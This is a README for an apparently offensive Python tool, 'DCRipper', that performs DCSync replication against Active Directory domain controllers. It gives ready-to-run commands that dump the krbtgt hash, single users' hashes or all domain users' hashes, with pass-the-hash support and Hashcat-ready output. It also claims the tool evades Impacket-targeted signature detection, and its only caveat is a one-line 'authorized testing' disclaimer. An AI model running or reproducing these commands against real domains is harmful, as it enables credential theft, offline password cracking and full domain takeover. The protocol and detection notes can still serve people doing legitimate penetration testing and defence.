# DCRipper

A pure Python implementation of the MS-DRSR (Directory Replication Service Remote Protocol) for Active Directory credential extraction. Built from scratch without Impacket dependencies.

## Features

- Pure Python MS-DRSR protocol implementation
- Custom DCE/RPC, NDR, and NTLM implementations
- Single user or full domain credential extraction
- Pass-the-Hash authentication support
- TCP and SMB transport options
- Hashcat and JSON output formats

## Requirements

```bash
pip install pycryptodome
```

## Usage

```bash
# Dump krbtgt (default)
python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -p Password123

# Dump specific user
python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -p Password123 -t administrator

# Dump all domain users
python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -p Password123 -a

# Pass-the-Hash
python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -H aad3b435b51404eeaad3b435b51404ee:ntlmhash

# Save to file
python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -p Password123 -a -o hashes.txt

# JSON output
python3 dcripper.py -dc 192.168.1.1 -d DOMAIN -u admin -p Password123 -f json
```

## Options

| Option | Description |
|--------|-------------|
| `-dc` | Domain controller IP or hostname |
| `-d` | Domain name (NETBIOS or FQDN) |
| `-u` | Username |
| `-p` | Password |
| `-H` | NTLM hash (`LMHASH:NTHASH` or `NTHASH`) |
| `-t` | Target user (default: krbtgt) |
| `-a` | Dump all users |
| `-o` | Output file |
| `-f` | Format: `hashcat` (default), `json` |
| `--smb` | Use SMB transport |
| `--timeout` | Timeout in seconds (default: 30) |
| `-v` | Verbose output |

## Output

**Hashcat format:**
```
DOMAIN\administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**JSON format:**
```json
{
  "domain": "DOMAIN",
  "username": "administrator",
  "rid": 500,
  "nt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0"
}
```

## How It Works

1. Endpoint Mapper query (port 135) to locate DRSUAPI service
2. NTLM authentication with packet privacy
3. DRSBind to establish replication session
4. DRSDomainControllerInfo to get DC metadata
5. DRSCrackNames for name resolution
6. DRSGetNCChanges with EXOP_REPL_SECRETS for credential replication
7. RC4 + DES decryption of replicated secrets

See [IMPLEMENTATION.md](IMPLEMENTATION.md) for protocol details.

## Required Privileges

- Domain Admins
- Enterprise Admins
- Replicating Directory Changes All

## Detection

This tool evades signature-based detection targeting Impacket, but behavior-based detection will still identify DCSync activity. Windows Event ID 4662 logs all replication requests regardless of the tool used.

## Disclaimer

For authorized security testing only.

## License

MIT
